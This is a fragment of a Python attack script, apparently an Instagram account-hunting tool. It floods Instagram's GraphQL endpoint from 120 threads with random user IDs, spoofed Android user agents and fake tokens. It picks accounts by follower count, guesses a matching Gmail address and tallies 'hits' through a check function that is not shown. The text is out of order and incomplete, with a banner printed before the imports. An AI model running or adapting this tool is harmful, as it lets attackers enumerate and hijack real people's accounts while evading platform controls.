    print(f"💚 Hits: {hits}   ❤️ Bad: {bad_gm}   📩 Bad Email: {bad_mail}")
    print("🔥" * 27)
    print(f"{'⚡ TOOL BY NOBITA ⚡':^54}")
    print("🔥" * 27)
import requests
import json
import random
import string
from threading import Thread
infoinsta={}
def safe_int_input(prompt,default):
	try:value=input(prompt).strip();return int(value)if value else default
	except:return default
ranges={1:(1279001,17750000),2:(17750000,279760000),3:(279760000,900990000),4:(900990000,1629010000),5:(1629010000,2500000000),6:(2500000000,3713668786),7:(3713668786,5699785217),8:(5699785217,8507940634),9:(8507940634,21254029834)}
print('\nSelect a year for user ID range:')
for k in range(1,10):print(f"{k} - {2010+k}")
year_choice=safe_int_input('Enter your year choice (1-9): ',5)
def generate_user_id():start,end=ranges.get(year_choice,ranges[5]);return str(random.randrange(start,end))
def gg(min_followers,min_posts,user_id_func):
	while True:
		try:
			user_id=user_id_func();model_number=str(random.randint(150,999));android_version=random.choice(['23/6.0','24/7.0','25/7.1.1','26/8.0','27/8.1','28/9.0']);dpi=str(random.randint(100,1300));resolution=f"{random.randint(200,2000)}x{random.randint(200,2000)}";brand=random.choice(['SAMSUNG','HUAWEI','LGE/lge','HTC','ASUS','ZTE','ONEPLUS','XIAOMI','OPPO','VIVO','SONY','REALME']);build_suffix=str(random.randint(111,999));user_agent=f"Instagram 311.0.0.32.118 Android ({android_version}; {dpi}dpi; {resolution}; {brand}; SM-T{model_number}; SM-T{model_number}; qcom; en_US; 545986{build_suffix})";lsd_token=''.join(random.choices(string.ascii_letters+string.digits,k=32));headers={'accept':'*/*','accept-language':'en,en-US;q=0.9','content-type':'application/x-www-form-urlencoded','dnt':'1','origin':'https://www.instagram.com','priority':'u=1, i','referer':'https://www.instagram.com/cristiano/following/','user-agent':user_agent,'x-fb-friendly-name':'PolarisUserHoverCardContentV2Query','x-fb-lsd':lsd_token};data={'lsd':lsd_token,'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'PolarisUserHoverCardContentV2Query','variables':json.dumps({'userID':user_id,'username':'cristiano'}),'server_timestamps':'true','doc_id':'7717269488336001'};response=requests.post('https://www.instagram.com/api/graphql',headers=headers,data=data);user_info=response.json().get('data',{}).get('user',{});username=user_info.get('username','');infoinsta[username]=user_info;follower_count=int(user_info.get('follower_count',0));media_count=int(user_info.get('media_count',0))
			if username and'_'not in username and follower_count>=min_followers and media_count>=min_posts:email=f"{username}@gmail.com";check(email)
		except:pass
minimum_followers=safe_int_input('Enter minimum followers needed: ',0)
minimum_posts=safe_int_input('Enter minimum number of posts needed: ',0)
for _ in range(120):Thread(target=gg,args=(minimum_followers,minimum_posts,generate_user_id)).start()
